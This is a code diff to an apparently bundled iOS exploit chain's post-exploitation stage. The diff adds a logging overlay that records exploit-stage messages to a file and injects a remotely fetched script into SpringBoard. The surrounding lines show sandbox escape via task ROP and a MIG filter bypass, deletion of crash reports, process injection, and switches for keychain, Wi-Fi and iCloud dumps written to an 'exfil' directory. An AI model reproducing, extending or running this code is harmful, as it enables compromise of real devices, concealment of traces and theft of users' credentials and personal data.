@@ -8464,7 +8464,12 @@ const ENABLE_CORUNA_TWEAKLOADER = false;
 const ENABLE_SPRINGBOARD_JS_TWEAK = !!globalThis.__ls_enable_fiveicon;
 const SPRINGBOARD_JS_TWEAK_PATH = "/sbcustomizer_light.js";
 const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
-const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK;
+const ENABLE_CHAIN_STATUS_OVERLAY = true;
+const CHAIN_STATUS_OVERLAY_PATH = "/chain_status_overlay.js";
+const CHAIN_STATUS_OVERLAY_LABEL = "Chain Status Overlay";
+const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
+const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
+const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK || ENABLE_CHAIN_STATUS_OVERLAY;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
@@ -8482,6 +8487,77 @@ const ENABLE_KEYCHAIN_DUMP = false;
 const ENABLE_WIFI_DUMP = false;
 const ENABLE_ICLOUD_DUMP = false;
 const ENABLE_DUMP_COPYOUT = false;
+
+let chainStatusLogReady = false;
+let chainStatusBuffer = [];
+let chainStatusLastLine = "";
+const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
+const chainStatusOriginalLog = LOG;
+LOG = function(msg) {
+	try { chainStatusRecord(msg); } catch (_) {}
+	try {
+		chainStatusOriginalLog(msg);
+	} catch (_) {
+		try { console.log(String(msg)); } catch (_) {}
+	}
+};
+
+function chainStatusCleanLine(raw) {
+	let line = String(raw || "").replace(/[\r\n]+/g, " ").trim();
+	if (line.length > 512) line = line.slice(0, 509) + "...";
+	return line;
+}
+
+function chainStatusRecord(raw) {
+	let line = chainStatusCleanLine(raw);
+	if (!line || !CHAIN_STATUS_FILTER_RE.test(line)) return;
+	if (line === chainStatusLastLine) return;
+	chainStatusLastLine = line;
+	if (!chainStatusLogReady) {
+		chainStatusBuffer.push(line);
+		if (chainStatusBuffer.length > CHAIN_STATUS_MAX_BUFFER_LINES) chainStatusBuffer.shift();
+		return;
+	}
+	chainStatusWriteLine(line, false);
+}
+
+function chainStatusWriteLine(line, truncate) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const O_WRONLY = 0x0001;
+	const O_APPEND = 0x0008;
+	const O_CREAT = 0x0200;
+	const O_TRUNC = 0x0400;
+	let flags = O_WRONLY | O_CREAT | (truncate ? O_TRUNC : O_APPEND);
+	let fd = Native.callSymbol("open", CHAIN_STATUS_LOG_PATH, flags, 0o644);
+	if (Number(fd) < 0) return false;
+	let ptr = 0n;
+	try {
+		let out = chainStatusCleanLine(line) + "\n";
+		let data = Native.stringToBytes(out, false);
+		ptr = Native.callSymbol("malloc", BigInt(data.byteLength));
+		if (!ptr || ptr === 0n) return false;
+		Native.write(ptr, data);
+		Native.callSymbol("write", fd, ptr, data.byteLength);
+		Native.callSymbol("fchmod", fd, 0o644);
+		return true;
+	} finally {
+		if (ptr) Native.callSymbol("free", ptr);
+		Native.callSymbol("close", fd);
+	}
+}
+
+function chainStatusInitLog() {
+	if (chainStatusLogReady) return;
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	try {
+		Native.callSymbol("mkdir", "/private/var/tmp", 0o777n);
+		Native.callSymbol("chmod", "/private/var/tmp", 0o777n);
+	} catch (_) {}
+	chainStatusWriteLine("[PE] chain status log reset", true);
+	chainStatusLogReady = true;
+	for (let line of chainStatusBuffer) chainStatusWriteLine(line, false);
+	chainStatusBuffer = [];
+}
 
 function fetchRemoteScript(path) {
 	if (!PE_ENABLE_DEBUG_NETWORK) {
@@ -8662,6 +8738,31 @@ function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agen
 	} catch (e) {
 		LOG("[PE] " + label + " inject exception: " + String(e));
 		LOG("[PE] " + label + " stack: " + (e.stack || "no stack"));
+		return false;
+	}
+}
+
+function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
+	LOG("[PE] Injecting " + CHAIN_STATUS_OVERLAY_LABEL + " into SpringBoard...");
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code source: " + (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0 ? "prefetched (" + globalThis.__chain_status_overlay_code.length + " bytes)" : "fetchRemoteScript(" + CHAIN_STATUS_OVERLAY_PATH + ")"));
+	let code = (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0) ? globalThis.__chain_status_overlay_code : fetchRemoteScript(CHAIN_STATUS_OVERLAY_PATH);
+	if (!code) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " fetch failed");
+		return false;
+	}
+	const prelude =
+		'globalThis.__bb_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
+		'globalThis.__bb_chain_status_complete_marker = "[PE] start() completed successfully";\n';
+	code = prelude + code;
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code loaded: " + code.length + " bytes");
+	try {
+		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
+		let ok = loader.inject(agentPid);
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject result: " + ok);
+		return ok;
+	} catch (e) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject exception: " + String(e));
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " stack: " + (e.stack || "no stack"));
 		return false;
 	}
 }
@@ -9645,12 +9746,14 @@ function start() { LOG("[+] PE start() called");
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
+	chainStatusInitLog();
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
+	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
 
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
@@ -9661,7 +9764,7 @@ function start() { LOG("[+] PE start() called");
 	if (ENABLE_SPRINGBOARD_AGENT) {
 		let agentLoader = null;
 		try {
-			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK);
+			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK + " overlay=" + ENABLE_CHAIN_STATUS_OVERLAY);
 			LOG("[PE] Creating agent loader for " + targetProcess);
 			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 			LOG("[PE] Agent loader created, calling inject()...");
@@ -9674,6 +9777,10 @@ function start() { LOG("[+] PE start() called");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
 				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
 				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
+				if (ENABLE_CHAIN_STATUS_OVERLAY)
+					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Chain status overlay disabled");
 				if (ENABLE_CORUNA_TWEAKLOADER)
 					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
 				else
